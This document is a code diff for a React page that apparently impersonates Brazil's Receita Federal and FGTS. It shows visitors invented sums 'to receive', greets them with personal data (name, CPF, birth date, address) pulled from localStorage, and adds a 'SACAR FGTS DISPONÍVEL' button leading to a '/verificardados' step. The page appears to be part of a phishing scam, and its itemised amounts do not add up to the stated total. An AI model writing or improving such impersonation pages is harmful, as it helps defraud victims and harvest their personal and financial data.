@@ -4,11 +4,33 @@ import logofgts from "../assets/fgts2.png";
 import flogo from "../assets/f-logo.png";
 import { FaCheckCircle } from "react-icons/fa";
 import { FaSpinner } from "react-icons/fa"; // Ícone de carregamento
+import { UserData } from "../types/userData";
 
 export function NotaFiscal() {
     const [progress, setProgress] = useState(0);
     const [displayedAmount, setDisplayedAmount] = useState(0);
-    const totalAmount = 6439.23;
+    const totalAmount = 3739.23;
+
+    const [userData, setUserData] = useState<UserData>({
+        nome: "",
+        cpf: "",
+        dataNascimento: "",
+        email: "",
+        cep: "",
+        cidade: "",
+        estado: "",
+        rua: "",
+        numero: ""
+    });
+
+    // Carregar os dados do localStorage ao montar o componente
+    useEffect(() => {
+        const storedUserData = localStorage.getItem("userData");
+        if (storedUserData) {
+            setUserData(JSON.parse(storedUserData));
+        }
+    }, []);
+
 
     useEffect(() => {
         document.title = "Certidão de Valores - Receita Federal";
@@ -35,7 +57,7 @@ export function NotaFiscal() {
                 <div className="flex items-center justify-between w-full">
                     <div className="flex items-center space-x-3">
                         <img width={34} src={logo} alt="logo" />
-                        <span className="text-white font-extralight">Olá, VICTOR</span>
+                        <span className="text-white font-extralight">Olá, {userData?.nome.split(" ")[0]}</span>
                     </div>
                     <img src={logofgts} alt="fgts" width={65} />
                 </div>
@@ -67,15 +89,31 @@ export function NotaFiscal() {
                     <span className="text-zinc-400 font-thin text-xl">Total a Receber:</span> <br /> R$ {displayedAmount.toFixed(2)}
                 </p>
 
+                {/* Botão Condicional */}
+                <a href="/verificardados">
+                    <button
+                        className={`w-full max-w-xs font-bold rounded-sm text-white py-4 my-4 flex items-center justify-center transition-all duration-300 ${progress < 100 ? "bg-gray-400 cursor-not-allowed" : "bg-green-600 hover:bg-orange-500"
+                            }`}
+                        disabled={progress < 100}
+                    >
+                        {progress < 100 ? (
+                            <FaSpinner className="animate-spin mr-2" />
+                        ) : (
+                            "SACAR FGTS DISPONÍVEL"
+                        )}
+                    </button>
+
+                </a>
+
                 {/* Detalhes dos Valores em Cards */}
                 <div className="space-y-4">
                     {[
-                        { amount: 743.51, description: "Contas de pagamento pré-paga encerradas" },
-                        { amount: 1419.42, description: "Rendimento de juros mensais de contas encerradas" },
-                        { amount: 540.73, description: "Cotas de capital e rateio de sobras líquidas" }
+                        { amount: "1.486,23", description: "Contas de pagamento pré-paga encerradas" },
+                        { amount: "1.990,47", description: "Rendimento de juros mensais de contas encerradas" },
+                        { amount: "263,00", description: "Cotas de capital e rateio de sobras líquidas" }
                     ].map((item, index) => (
                         <div key={index} className="bg-white border border-zinc-200 rounded-lg p-4 shadow-sm flex flex-col items-center space-y-1">
-                            <span className="text-2xl font-semibold text-green-700">R$ {item.amount.toFixed(2)}</span>
+                            <span className="text-2xl font-semibold text-green-700">R$ {item.amount}</span>
                             <span className="text-sm text-zinc-600 text-center">{item.description}</span>
                         </div>
                     ))}
